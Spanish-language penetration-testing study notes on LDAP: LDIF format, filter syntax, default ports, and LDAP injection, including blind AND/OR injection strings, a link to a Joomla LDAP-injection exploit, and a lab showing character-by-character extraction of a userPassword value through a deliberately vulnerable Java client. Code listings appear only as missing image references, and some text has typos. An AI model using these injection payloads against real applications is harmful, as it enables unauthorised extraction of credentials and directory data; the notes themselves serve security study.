# Atacar LDAP

LDAP son las siglas de **Lightweight Directory Access Protocol (Protocolo ligero de acceso a directorios**). Es un protocolo utilizado para modificar y consultar servicios de directorio a través de TCP/IP

* Los servicios de directorio son un almacenamiento virtual similar a una base de datos que contiene datos en una estructura jerárquica específica. La estructura LDAP se basa en un árbol de directorio de entradas

LDAP está orientado a objetos, por lo que cada entrada en un servicio de directorio LDAP es una instancia de un objeto y debe corresponder a las reglas establecidas para los atributos del objeto.

* LDAP no solo puede consultar objetos de una base de datos de directorios, sino que también se puede utilizar para la administración y autenticación.
* Tenga en cuenta que LDAP es solo un protocolo para acceder al servicio de directorio, no un mecanismo de almacenamiento en sí mismo.

LDAP se utiliza para comunicarse con Directory Databasess, pero como protocolo no proporciona ninguna capacidad de almacenamiento.

* Ejemplos de bases de datos que utilizan la estructura de directorios son **Microsoft Active Directory** (donde LDAP se utiliza a menudo en el proceso de autenticación) o el menos conocido **OpenLDAP**

#### Formato LDIF <a href="#ldif-format" id="ldif-format"></a>

Los objetos en los accesos a la base de datos de directorios a través de LDAP se almacenan en LDIF, que significa **Formato de intercambio de datos LDAP**. LDIF define el contenido del directorio como un conjunto de registros, un recor para cada objeto (o entrada). También representa las solicitudes de actualización, como Agregar, Modificar, Eliminar y Cambiar nombre, como un conjunto de registros, un registro para cada solicitud de actualización.

* Una base de datos de directorios puede admitir LDIF definiendo sus supuestos en un archivo LDIF. Puede ser un archivo de texto plano que simplemente contenga la representación de datos del directorio, así como comandos LDAP. También se utilizan para leer, escribir y actualizar datos en un directorio.

![[Pasted image 20240311161151.png]]

```
Lines 1-3:
We are defining the top-level domain **org**

Lines 5-8:
We are defining the subdomain **samplecompany**,for example **samplecompany.org**

Lines 10-16:
We define two organization units (OU): it and marketing

Lines 18-26:
We then add objects to the domain **samplecompany.org** and assign attributes with values
# for example, *sn* stands for **surname**, “cn” stands for canonical name (or first name), while *mail* is a placeholder for an email address
```

Cada base de datos de servicios de directorio puede tener diferentes atributos predeterminados

> Por ejemplo, en las implementaciones de OpenLDAP se puede encontrar un atributo userPassword \* (que puede ser interesante desde el punto de vista de un pentester) mientras que no existe tal atributo en Active Directory.

### Sintaxis LDAP <a href="#ldap-syntax" id="ldap-syntax"></a>

Estructura Para consultar la base de datos back-end:

```
= # equal to
| # logical or
! # logical not
& # logical and
* # wildcard - stands For any string or character
```

Ejemplos:

```
ch=John - will fetch personal entries where canonical name is "john"
ch=J*   - will fetch personal entries where canonical name starts with "j" as a wildcard is placed in the query
```

También se pueden concatenar:

```
(|(sn=a*)(cn=b*))
# the first 'OR' operator is used in order to indicate that we either look For all records which surname 
# starts with "a" OR canonical name starts with "b"
```

#### Implementaciones LDAP <a href="#ldap-implementations" id="ldap-implementations"></a>

El LDAP como protocolo puede ser una implementación completamente independiente de la base de datos existente

Dicho esto, podemos, por ejemplo, configurar una aplicación web en el servidor como front-end de una base de datos de Active Directory

> Es posible utilizar AD (u otra base de datos basada en directorios) con LDAP para autenticar a los usuarios de la aplicación web.

* Este es un método conveniente, ya que algunos roles o atributos de usuario se compartirán con los usuarios del dominio, que luego se pueden usar con fines de autorización dentro de una aplicación web

De este modo, una aplicación web puede basarse en **PDAP** y en los atributos de rol de directorio respaldados al autorizar a los usuarios a acceder a determinados recursos

* Por supuesto, LDAP se puede encontrar como una base de datos que contiene información diferente, que puede incluir datos de empleados o atributos de cuentas de usuario; Considere una interfaz web que se pueda utilizar para navegar por la estructura de los empleados en la empresa

> En este escenario, la aplicación web podría tomar la entrada de los usuarios e incorporarla a la consulta LDAP para recuperar los resultados de la base de datos y presentarlos al usuario de la aplicación.

### Abusar de LDAP <a href="#abusing-ldap" id="abusing-ldap"></a>

#### LDAP sobre TCP <a href="#ldap-over-tcp" id="ldap-over-tcp"></a>

A menudo puede encontrar servicios LDAP durante el escaneo de la infraestructura de red en los puertos predeterminados:

```
389 - For unencrypted connections
636 - For LDAP SSL
```

Para conectarse a servicios LDAP independientes a través del protocolo TCP puro, puede utilizar una herramienta llamada **JXplorer**. Se puede descargar en varios formatos desde su página de inicio y no requiere instalación. También se puede descargar como un archivo jar independiente, que se puede ejecutar usando el comando:

```
java -jar JXplorer.jar
http://jxplorer.org/
```

> Dado que estamos centrados en implementaciones basadas en la web, dejaremos el JQXplorer para nuestros experimentos.

Como se mencionó anteriormente, LDAP se puede integrar con una aplicación web, que puede tomar la entrada del usuario e implementarla en una consulta LDAP. Si no hay saneamiento de la entrada del usuario, varias cosas pueden salir mal.

#### Vulnerabilidades LDAP <a href="#ldap-vulnerabilities" id="ldap-vulnerabilities"></a>

Lo que puede suceder sin una desinfección adecuada del usuario en las implementaciones LDAP basadas en la web depende en gran medida del propósito y el contenido del LDAP.

* Los vulns básicos y más obvios pueden ser la inyección LDAP. Si la consulta no está lo suficientemente saneada, un atacante puede colocar un comodín en lugar de un objeto legítimo, extrayendo todos los objetos en lugar de solo uno.

Dependiendo de la arquitectura de la aplicación, puede o no ser un fallo de seguridad.

* Si el usuario no estaba destinado a ver el objeto al que hizo accesible mediante un comodín, la inyección LDAP da como resultado la recuperación de información confidencial.

Extraer una gran cantidad de datos a la vez también podría conducir a una condición de denegación de servicio; Si la base de datos back-end es lo suficientemente grande, es muy probable que la base de datos front-end se haya diseñado para filtrar los resultados de la consulta con el fin de no sobrecargar el motor de base de datos.

> En ese caso, varias consultas comodín pueden hacer que la base de datos no esté disponible, lo que impide el acceso al servicio de la aplicación.

Un vuln crítico de 2017: sitios web basados en Joomla cuando se utilizó el complemento de autenticación LDAP:

```
https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/
```

Se puede encontrar un exploit disponible en el siguiente recurso:

```
http://www.spy-soft.net/wp-content/uploads/Joomla-LDAP-Injection.txt
```

* Supongamos que un atacante puede inferir a partir de las respuestas del servidor que el código inyectado en la consulta LDAP genera true (respuesta válida) o false (error)

> En tal caso, todavía es posible explotar una inyección LDAP ciega.

#### Inyección LDAP <a href="#ldap-injection" id="ldap-injection"></a>

Supongamos que una aplicación web nos permite listar todas las impresoras disponibles desde un directorio LDAP. Los mensajes de error no se devuelven. La aplicación utiliza el siguiente filtro de búsqueda:

```
(&(objectclass=printer)(type=Canon*))
```

Como resultado, si hay impresoras Canon disponibles, los iconos de estas impresoras se muestran al cliente. De lo contrario, no hay ningún icono presente. Esta es una situación ejemplar de verdadero/falso.

#### Inyección LDAP ciega <a href="#blind-ldap-injection" id="blind-ldap-injection"></a>

Si inyectamos la cadena ")(objectClass=))(&(_objectClass_=void", entonces la aplicación web emitirá la siguiente consulta:

```
(&(objectClass=*)(objectClass=*))(&objectClass=void)(type=Canon*))
```

> En ese caso, solo se procesará la primera consulta LDAP, lo que dará como resultado que (&(objectClass=)(_objectClass=_)) se extraiga del back-end.

Como resultado, el icono de la impresora se mostrará al cliente. Como esta consulta siempre devuelve resultados debido a que objectClass se establece en un comodín. Podemos construir más afirmaciones verdaderas/falsas de la siguiente manera:

```
(&(objectClass=*)(objectClass=users))(&objectClass=foo)(type=Canon*))
(&(objectClass=*)(objectClass=resources))(&objectClass=foo)(type=Canon*))
```

* Con estas consultas, es posible enumerar posibles clases de objetos en función de condiciones de verdadero/falso (el icono de la impresora debe mostrarse o no)

Se puede utilizar una lógica similar en el caso de la inyección LDAP **ciega OR**. Considere la siguiente consulta con la parte inyectada en rojo:

```
(|(objectClass=void)(objectClass=void))(&objectClass=void)(type=Canon*))
```

> Una consulta de este tipo no devuelve ningún objeto, por lo que el icono de la impresora no debe mostrarse al usuario

Para recopilar información, se puede aplicar una técnica similar:

```
(|(objectClass=void)(objectClass=users))(&objectClass=void)(type=Canon*))
(|(objectClass=void)(objectClass=resources))(&objectClass=void)(type=Canon*))
```

> Esto nos permitirá enumerar la estructura de directorios

### Implementación de LDAP Python <a href="#ldap-python-implementation" id="ldap-python-implementation"></a>

Tenga en cuenta el siguiente código que puede ser responsable de la implementación de la lógica del servidor LDAP

#### Implementación del servidor LDAP <a href="#implementing-ldap-server" id="implementing-ldap-server"></a>

Aquí estamos importando algunos módulos:

![[Pasted image 20240311161236.png]]
Un archivo LDIF se define como una variable denominada LDIF

* La estructura de directorios se define aquí

![[Pasted image 20240311161250.png]]

La clase principal del LDAPserver.py se define:
![[Pasted image 20240311161308.png]]
Aquí se define la función principal.

El servidor LDAP escuchará las conexiones entrantes en el puerto 8080 del host local o en un puerto especificado en la línea de comandos.
![[Pasted image 20240311161336.png]]
Python ldapserver.py para iniciar el servidor:
![[Pasted image 20240311161356.png]]
> Asegúrese de que el puerto 8080 esté disponible, ya que el servidor no producirá una excepción en tal caso

#### Implementación del cliente LDAP <a href="#implementing-ldap-client" id="implementing-ldap-client"></a>

El archivo se llamará LDAPinfo.java

* Aquí importamos algunos paquetes que se utilizarán en el software
![[Pasted image 20240311161405.png]]
Los comentarios de la clase LDAPinfo contienen una explicación de las funcionalidades
![[Pasted image 20240311161423.png]]
El código fuente mencionado se puede compilar con:

```
javac -d classes LDAPinfo.java
```

Y luego se puede ejecutar con:

```
java -cp classes LDAPinfo bob
```
![[Pasted image 20240311161445.png]]
#### Ejemplo de inyección LDAP ciega <a href="#blind-ldap-injection-example" id="blind-ldap-injection-example"></a>

El cliente que hemos compilado es vulnerable a la inyección de LDAP ciego. Vamos a tratar de usarlo de una manera lifitimate primero

```
java -cp classes LDAPinfo bob # found
java -cp classes LDAPinfo notbob # not found
```

A pesar de que la aplicación imprime solo el número de teléfono, puede ser útil para extraer más datos. Echa un vistazo al ejemplo:

```
java -cp classes LDAPinfo "bob)(userPassword=a*" # nothing found
```

Vamos a enumerar más letras:

```
java -cp classes LDAPinfo "bob)(userPassword=b*" # keep going
```

Al encontrarnos con la letra 's', podemos ver que se muestra el número de teléfono

```
java -cp classes LDAPinfo "bob)(userPassword=s*" # found
# it means that the first letter of the password is "s"
```

Podemos ir más allá hasta encontrar la contraseña completa

```
java -cp classes LDAPinfo "bob)(userPassword=secret"  
```

> Un escenario de explotación de este tipo podría ser perfecto para la extracción de información confidencial Aunque estábamos usando una interfaz LDAP de línea de comandos, tenga en cuenta que la aplicación web funcionaría con LDAP de la misma manera

\
